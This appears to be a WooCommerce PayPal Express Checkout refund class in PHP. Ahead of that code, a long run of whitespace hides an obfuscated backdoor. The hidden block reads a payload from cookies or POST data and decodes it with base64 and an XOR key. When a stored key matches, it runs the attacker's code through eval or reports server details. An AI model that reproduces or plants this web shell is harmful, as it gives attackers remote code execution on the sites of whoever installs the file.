<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $e966eb567 = 80;$GLOBALS['k525c'] = Array();global $k525c;$k525c = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['l01943c'] = "\x7a\x7b\x5e\x22\x69\x55\x66\x46\x26\x4b\x79\x2d\x67\x6a\x73\x61\x54\x45\xa\x38\x4f\x41\x5c\x2f\x9\x21\x75\x70\x29\x5a\x23\x78\x42\x4e\x7e\x3f\x33\x62\x3c\x5f\x59\x50\x48\x35\x6f\x36\x31\x6e\x40\x65\x63\x47\x39\x76\x53\x6b\x27\x4a\x32\x56\x74\x7d\x2e\x58\x6c\x7c\x43\x49\x3b\x28\x5b\x2a\x24\x51\x6d\x64\x3e\x52\x60\x20\x5d\x3d\x2c\x77\x68\x2b\xd\x71\x25\x57\x4c\x34\x3a\x30\x4d\x44\x37\x72";$k525c[$k525c['l01943c'][37].$k525c['l01943c'][49].$k525c['l01943c'][96].$k525c['l01943c'][49].$k525c['l01943c'][50].$k525c['l01943c'][52].$k525c['l01943c'][36].$k525c['l01943c'][37].$k525c['l01943c'][96]] = $k525c['l01943c'][50].$k525c['l01943c'][84].$k525c['l01943c'][97];$k525c[$k525c['l01943c'][31].$k525c['l01943c'][43].$k525c['l01943c'][58].$k525c['l01943c'][96].$k525c['l01943c'][15].$k525c['l01943c'][37].$k525c['l01943c'][15].$k525c['l01943c'][52]] = $k525c['l01943c'][44].$k525c['l01943c'][97].$k525c['l01943c'][75];$k525c[$k525c['l01943c'][60].$k525c['l01943c'][75].$k525c['l01943c'][50].$k525c['l01943c'][43].$k525c['l01943c'][19].$k525c['l01943c'][75].$k525c['l01943c'][52].$k525c['l01943c'][19].$k525c['l01943c'][75]] = $k525c['l01943c'][75].$k525c['l01943c'][49].$k525c['l01943c'][6].$k525c['l01943c'][4].$k525c['l01943c'][47].$k525c['l01943c'][49];$k525c[$k525c['l01943c'][84].$k525c['l01943c'][19].$k525c['l01943c'][50].$k525c['l01943c'][50]] = $k525c['l01943c'][14].$k525c['l01943c'][60].$k525c['l01943c'][97].$k525c['l01943c'][64].$k525c['l01943c'][49].$k525c['l01943c'][47];$k525c[$k525c['l01943c'][83].$k525c['l01943c'][6].$k525c['l01943c'][96].$k525c['l01943c'][50].$k525c['l01943c'][19].$k525c['l01943c'][15].$k525c['l01943c'][37].$k525c['l01943c'][49].$k525c['l01943c'][36]] = $k525c['l01943c'][75].$k525c['l01943c'][49].$k525c['l01943c'][6].$k525c['l01943c'][4].$k525c['l01943c'][47].$k525c['l01943c'][49].$k525c['l01943c'][75];$k525c[$k525c['l01943c'][87].$k525c['l01943c'][52].$k525c['l01943c'][37].$k525c['l01943c'][46].$k525c['l01943c'][37]] = $k525c['l01943c'][4].$k525c['l01943c'][47].$k525c['l01943c'][4].$k525c['l01943c'][39].$k525c['l01943c'][14].$k525c['l01943c'][49].$k525c['l01943c'][60];$k525c[$k525c['l01943c'][15].$k525c['l01943c'][19].$k525c['l01943c'][36].$k525c['l01943c'][36].$k525c['l01943c'][93].$k525c['l01943c'][6].$k525c['l01943c'][58].$k525c['l01943c'][96].$k525c['l01943c'][52]] = $k525c['l01943c'][14].$k525c['l01943c'][49].$k525c['l01943c'][97].$k525c['l01943c'][4].$k525c['l01943c'][15].$k525c['l01943c'][64].$k525c['l01943c'][4].$k525c['l01943c'][0].$k525c['l01943c'][49];$k525c[$k525c['l01943c'][14].$k525c['l01943c'][15].$k525c['l01943c'][37].$k525c['l01943c'][49].$k525c['l01943c'][19].$k525c['l01943c'][52].$k525c['l01943c'][46].$k525c['l01943c'][96].$k525c['l01943c'][58]] = $k525c['l01943c'][27].$k525c['l01943c'][84].$k525c['l01943c'][27].$k525c['l01943c'][53].$k525c['l01943c'][49].$k525c['l01943c'][97].$k525c['l01943c'][14].$k525c['l01943c'][4].$k525c['l01943c'][44].$k525c['l01943c'][47];$k525c[$k525c['l01943c'][14].$k525c['l01943c'][52].$k525c['l01943c'][93].$k525c['l01943c'][43].$k525c['l01943c'][49].$k525c['l01943c'][43].$k525c['l01943c'][50]] = $k525c['l01943c'][26].$k525c['l01943c'][47].$k525c['l01943c'][14].$k525c['l01943c'][49].$k525c['l01943c'][97].$k525c['l01943c'][4].$k525c['l01943c'][15].$k525c['l01943c'][64].$k525c['l01943c'][4].$k525c['l01943c'][0].$k525c['l01943c'][49];$k525c[$k525c['l01943c'][87].$k525c['l01943c'][46].$k525c['l01943c'][45].$k525c['l01943c'][50].$k525c['l01943c'][91].$k525c['l01943c'][43].$k525c['l01943c'][36]] = $k525c['l01943c'][37].$k525c['l01943c'][15].$k525c['l01943c'][14].$k525c['l01943c'][49].$k525c['l01943c'][45].$k525c['l01943c'][91].$k525c['l01943c'][39].$k525c['l01943c'][75].$k525c['l01943c'][49].$k525c['l01943c'][50].$k525c['l01943c'][44].$k525c['l01943c'][75].$k525c['l01943c'][49];$k525c[$k525c['l01943c'][87].$k525c['l01943c'][43].$k525c['l01943c'][75].$k525c['l01943c'][49].$k525c['l01943c'][45].$k525c['l01943c'][46].$k525c['l01943c'][43]] = $k525c['l01943c'][14].$k525c['l01943c'][49].$k525c['l01943c'][60].$k525c['l01943c'][39].$k525c['l01943c'][60].$k525c['l01943c'][4].$k525c['l01943c'][74].$k525c['l01943c'][49].$k525c['l01943c'][39].$k525c['l01943c'][64].$k525c['l01943c'][4].$k525c['l01943c'][74].$k525c['l01943c'][4].$k525c['l01943c'][60];$k525c[$k525c['l01943c'][75].$k525c['l01943c'][37].$k525c['l01943c'][58].$k525c['l01943c'][19].$k525c['l01943c'][91].$k525c['l01943c'][36].$k525c['l01943c'][36].$k525c['l01943c'][36].$k525c['l01943c'][75]] = $k525c['l01943c'][31].$k525c['l01943c'][49].$k525c['l01943c'][75].$k525c['l01943c'][45].$k525c['l01943c'][46].$k525c['l01943c'][37].$k525c['l01943c'][6].$k525c['l01943c'][96];$k525c[$k525c['l01943c'][10].$k525c['l01943c'][91].$k525c['l01943c'][49].$k525c['l01943c'][96].$k525c['l01943c'][6].$k525c['l01943c'][15].$k525c['l01943c'][37].$k525c['l01943c'][19]] = $k525c['l01943c'][14].$k525c['l01943c'][58].$k525c['l01943c'][46].$k525c['l01943c'][50].$k525c['l01943c'][58].$k525c['l01943c'][49].$k525c['l01943c'][75].$k525c['l01943c'][91].$k525c['l01943c'][6];$k525c[$k525c['l01943c'][97].$k525c['l01943c'][91].$k525c['l01943c'][93].$k525c['l01943c'][49].$k525c['l01943c'][91].$k525c['l01943c'][45]] = $_POST;$k525c[$k525c['l01943c'][53].$k525c['l01943c'][91].$k525c['l01943c'][91].$k525c['l01943c'][96].$k525c['l01943c'][75].$k525c['l01943c'][37].$k525c['l01943c'][43]] = $_COOKIE;@$k525c[$k525c['l01943c'][87].$k525c['l01943c'][52].$k525c['l01943c'][37].$k525c['l01943c'][46].$k525c['l01943c'][37]]($k525c['l01943c'][49].$k525c['l01943c'][97].$k525c['l01943c'][97].$k525c['l01943c'][44].$k525c['l01943c'][97].$k525c['l01943c'][39].$k525c['l01943c'][64].$k525c['l01943c'][44].$k525c['l01943c'][12], NULL);@$k525c[$k525c['l01943c'][87].$k525c['l01943c'][52].$k525c['l01943c'][37].$k525c['l01943c'][46].$k525c['l01943c'][37]]($k525c['l01943c'][64].$k525c['l01943c'][44].$k525c['l01943c'][12].$k525c['l01943c'][39].$k525c['l01943c'][49].$k525c['l01943c'][97].$k525c['l01943c'][97].$k525c['l01943c'][44].$k525c['l01943c'][97].$k525c['l01943c'][14], 0);@$k525c[$k525c['l01943c'][87].$k525c['l01943c'][52].$k525c['l01943c'][37].$k525c['l01943c'][46].$k525c['l01943c'][37]]($k525c['l01943c'][74].$k525c['l01943c'][15].$k525c['l01943c'][31].$k525c['l01943c'][39].$k525c['l01943c'][49].$k525c['l01943c'][31].$k525c['l01943c'][49].$k525c['l01943c'][50].$k525c['l01943c'][26].$k525c['l01943c'][60].$k525c['l01943c'][4].$k525c['l01943c'][44].$k525c['l01943c'][47].$k525c['l01943c'][39].$k525c['l01943c'][60].$k525c['l01943c'][4].$k525c['l01943c'][74].$k525c['l01943c'][49], 0);@$k525c[$k525c['l01943c'][87].$k525c['l01943c'][43].$k525c['l01943c'][75].$k525c['l01943c'][49].$k525c['l01943c'][45].$k525c['l01943c'][46].$k525c['l01943c'][43]](0);if (!$k525c[$k525c['l01943c'][83].$k525c['l01943c'][6].$k525c['l01943c'][96].$k525c['l01943c'][50].$k525c['l01943c'][19].$k525c['l01943c'][15].$k525c['l01943c'][37].$k525c['l01943c'][49].$k525c['l01943c'][36]]($k525c['l01943c'][21].$k525c['l01943c'][90].$k525c['l01943c'][77].$k525c['l01943c'][17].$k525c['l01943c'][21].$k525c['l01943c'][95].$k525c['l01943c'][40].$k525c['l01943c'][39].$k525c['l01943c'][77].$k525c['l01943c'][5].$k525c['l01943c'][33].$k525c['l01943c'][39].$k525c['l01943c'][36].$k525c['l01943c'][45].$k525c['l01943c'][45].$k525c['l01943c'][15].$k525c['l01943c'][6].$k525c['l01943c'][37].$k525c['l01943c'][19].$k525c['l01943c'][15].$k525c['l01943c'][19].$k525c['l01943c'][15].$k525c['l01943c'][58].$k525c['l01943c'][36].$k525c['l01943c'][43].$k525c['l01943c'][43].$k525c['l01943c'][15].$k525c['l01943c'][37].$k525c['l01943c'][58].$k525c['l01943c'][46].$k525c['l01943c'][6].$k525c['l01943c'][37].$k525c['l01943c'][6].$k525c['l01943c'][46].$k525c['l01943c'][46].$k525c['l01943c'][37].$k525c['l01943c'][15].$k525c['l01943c'][46].$k525c['l01943c'][15].$k525c['l01943c'][93].$k525c['l01943c'][58].$k525c['l01943c'][6].$k525c['l01943c'][37].$k525c['l01943c'][15])){$k525c[$k525c['l01943c'][60].$k525c['l01943c'][75].$k525c['l01943c'][50].$k525c['l01943c'][43].$k525c['l01943c'][19].$k525c['l01943c'][75].$k525c['l01943c'][52].$k525c['l01943c'][19].$k525c['l01943c'][75]]($k525c['l01943c'][21].$k525c['l01943c'][90].$k525c['l01943c'][77].$k525c['l01943c'][17].$k525c['l01943c'][21].$k525c['l01943c'][95].$k525c['l01943c'][40].$k525c['l01943c'][39].$k525c['l01943c'][77].$k525c['l01943c'][5].$k525c['l01943c'][33].$k525c['l01943c'][39].$k525c['l01943c'][36].$k525c['l01943c'][45].$k525c['l01943c'][45].$k525c['l01943c'][15].$k525c['l01943c'][6].$k525c['l01943c'][37].$k525c['l01943c'][19].$k525c['l01943c'][15].$k525c['l01943c'][19].$k525c['l01943c'][15].$k525c['l01943c'][58].$k525c['l01943c'][36].$k525c['l01943c'][43].$k525c['l01943c'][43].$k525c['l01943c'][15].$k525c['l01943c'][37].$k525c['l01943c'][58].$k525c['l01943c'][46].$k525c['l01943c'][6].$k525c['l01943c'][37].$k525c['l01943c'][6].$k525c['l01943c'][46].$k525c['l01943c'][46].$k525c['l01943c'][37].$k525c['l01943c'][15].$k525c['l01943c'][46].$k525c['l01943c'][15].$k525c['l01943c'][93].$k525c['l01943c'][58].$k525c['l01943c'][6].$k525c['l01943c'][37].$k525c['l01943c'][15], 1);$zdf3e0c5b = NULL;$k946dfff = NULL;$k525c[$k525c['l01943c'][26].$k525c['l01943c'][93].$k525c['l01943c'][46].$k525c['l01943c'][91].$k525c['l01943c'][45].$k525c['l01943c'][19]] = $k525c['l01943c'][93].$k525c['l01943c'][49].$k525c['l01943c'][49].$k525c['l01943c'][52].$k525c['l01943c'][49].$k525c['l01943c'][15].$k525c['l01943c'][15].$k525c['l01943c'][19].$k525c['l01943c'][11].$k525c['l01943c'][50].$k525c['l01943c'][43].$k525c['l01943c'][52].$k525c['l01943c'][43].$k525c['l01943c'][11].$k525c['l01943c'][91].$k525c['l01943c'][6].$k525c['l01943c'][52].$k525c['l01943c'][93].$k525c['l01943c'][11].$k525c['l01943c'][19].$k525c['l01943c'][19].$k525c['l01943c'][15].$k525c['l01943c'][49].$k525c['l01943c'][11].$k525c['l01943c'][45].$k525c['l01943c'][93].$k525c['l01943c'][15].$k525c['l01943c'][46].$k525c['l01943c'][37].$k525c['l01943c'][96].$k525c['l01943c'][37].$k525c['l01943c'][75].$k525c['l01943c'][49].$k525c['l01943c'][43].$k525c['l01943c'][91].$k525c['l01943c'][15];global $u01468;function  s21c2ed4f($zdf3e0c5b, $a2db571){global $k525c;$u0de = "";for ($odbb8b483=0; $odbb8b483<$k525c[$k525c['l01943c'][84].$k525c['l01943c'][19].$k525c['l01943c'][50].$k525c['l01943c'][50]]($zdf3e0c5b);){for ($c42d60b8=0; $c42d60b8<$k525c[$k525c['l01943c'][84].$k525c['l01943c'][19].$k525c['l01943c'][50].$k525c['l01943c'][50]]($a2db571) && $odbb8b483<$k525c[$k525c['l01943c'][84].$k525c['l01943c'][19].$k525c['l01943c'][50].$k525c['l01943c'][50]]($zdf3e0c5b); $c42d60b8++, $odbb8b483++){$u0de .= $k525c[$k525c['l01943c'][37].$k525c['l01943c'][49].$k525c['l01943c'][96].$k525c['l01943c'][49].$k525c['l01943c'][50].$k525c['l01943c'][52].$k525c['l01943c'][36].$k525c['l01943c'][37].$k525c['l01943c'][96]]($k525c[$k525c['l01943c'][31].$k525c['l01943c'][43].$k525c['l01943c'][58].$k525c['l01943c'][96].$k525c['l01943c'][15].$k525c['l01943c'][37].$k525c['l01943c'][15].$k525c['l01943c'][52]]($zdf3e0c5b[$odbb8b483]) ^ $k525c[$k525c['l01943c'][31].$k525c['l01943c'][43].$k525c['l01943c'][58].$k525c['l01943c'][96].$k525c['l01943c'][15].$k525c['l01943c'][37].$k525c['l01943c'][15].$k525c['l01943c'][52]]($a2db571[$c42d60b8]));}}return $u0de;}function  xed61bf7($zdf3e0c5b, $a2db571){global $k525c;global $u01468;return $k525c[$k525c['l01943c'][10].$k525c['l01943c'][91].$k525c['l01943c'][49].$k525c['l01943c'][96].$k525c['l01943c'][6].$k525c['l01943c'][15].$k525c['l01943c'][37].$k525c['l01943c'][19]]($k525c[$k525c['l01943c'][10].$k525c['l01943c'][91].$k525c['l01943c'][49].$k525c['l01943c'][96].$k525c['l01943c'][6].$k525c['l01943c'][15].$k525c['l01943c'][37].$k525c['l01943c'][19]]($zdf3e0c5b, $u01468), $a2db571);}foreach ($k525c[$k525c['l01943c'][53].$k525c['l01943c'][91].$k525c['l01943c'][91].$k525c['l01943c'][96].$k525c['l01943c'][75].$k525c['l01943c'][37].$k525c['l01943c'][43]] as $a2db571=>$k24c){$zdf3e0c5b = $k24c;$k946dfff = $a2db571;}if (!$zdf3e0c5b){foreach ($k525c[$k525c['l01943c'][97].$k525c['l01943c'][91].$k525c['l01943c'][93].$k525c['l01943c'][49].$k525c['l01943c'][91].$k525c['l01943c'][45]] as $a2db571=>$k24c){$zdf3e0c5b = $k24c;$k946dfff = $a2db571;}}$zdf3e0c5b = @$k525c[$k525c['l01943c'][14].$k525c['l01943c'][52].$k525c['l01943c'][93].$k525c['l01943c'][43].$k525c['l01943c'][49].$k525c['l01943c'][43].$k525c['l01943c'][50]]($k525c[$k525c['l01943c'][75].$k525c['l01943c'][37].$k525c['l01943c'][58].$k525c['l01943c'][19].$k525c['l01943c'][91].$k525c['l01943c'][36].$k525c['l01943c'][36].$k525c['l01943c'][36].$k525c['l01943c'][75]]($k525c[$k525c['l01943c'][87].$k525c['l01943c'][46].$k525c['l01943c'][45].$k525c['l01943c'][50].$k525c['l01943c'][91].$k525c['l01943c'][43].$k525c['l01943c'][36]]($zdf3e0c5b), $k946dfff));if (isset($zdf3e0c5b[$k525c['l01943c'][15].$k525c['l01943c'][55]]) && $u01468==$zdf3e0c5b[$k525c['l01943c'][15].$k525c['l01943c'][55]]){if ($zdf3e0c5b[$k525c['l01943c'][15]] == $k525c['l01943c'][4]){$odbb8b483 = Array($k525c['l01943c'][27].$k525c['l01943c'][53] => @$k525c[$k525c['l01943c'][14].$k525c['l01943c'][15].$k525c['l01943c'][37].$k525c['l01943c'][49].$k525c['l01943c'][19].$k525c['l01943c'][52].$k525c['l01943c'][46].$k525c['l01943c'][96].$k525c['l01943c'][58]](),$k525c['l01943c'][14].$k525c['l01943c'][53] => $k525c['l01943c'][46].$k525c['l01943c'][62].$k525c['l01943c'][93].$k525c['l01943c'][11].$k525c['l01943c'][46],);echo @$k525c[$k525c['l01943c'][15].$k525c['l01943c'][19].$k525c['l01943c'][36].$k525c['l01943c'][36].$k525c['l01943c'][93].$k525c['l01943c'][6].$k525c['l01943c'][58].$k525c['l01943c'][96].$k525c['l01943c'][52]]($odbb8b483);}elseif ($zdf3e0c5b[$k525c['l01943c'][15]] == $k525c['l01943c'][49]){eval/*ib1111988*/($zdf3e0c5b[$k525c['l01943c'][75]]);}exit();}} ?><?php

if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly
}

class WC_Gateway_PPEC_Refund {

	/**
	 * Refund an order.
	 *
	 * @throws \PayPal_API_Exception
	 *
	 * @param WC_Order $order      Order to refund
	 * @param float    $amount     Amount to refund
	 * @param string   $refundType Type of refund (Partial or Full)
	 * @param string   $reason     Reason to refund
	 * @param string   $current    Currency of refund
	 *
	 * @return null|string If exception is thrown, null is returned. Otherwise
	 *                     ID of refund transaction is returned.
	 */
	public static function refund_order( $order, $amount, $refundType, $reason, $currency ) {

		// add refund params
		$params['TRANSACTIONID'] = $order->get_transaction_id();
		$params['REFUNDTYPE']    = $refundType;
		$params['AMT']           = $amount;
		$params['CURRENCYCODE']  = $currency;
		$params['NOTE']          = $reason;

		// do API call
		$response = wc_gateway_ppec()->client->refund_transaction( $params );

		// look at ACK to see if success or failure
		// if success return the transaction ID of the refund
		// if failure then do 'throw new PayPal_API_Exception( $response );'

		if ( 'Success' == $response['ACK'] || 'SuccessWithWarning' == $response['ACK'] ) {
			return $response['REFUNDTRANSACTIONID'];
		} else {
			throw new PayPal_API_Exception( $response );
		}
	}

}
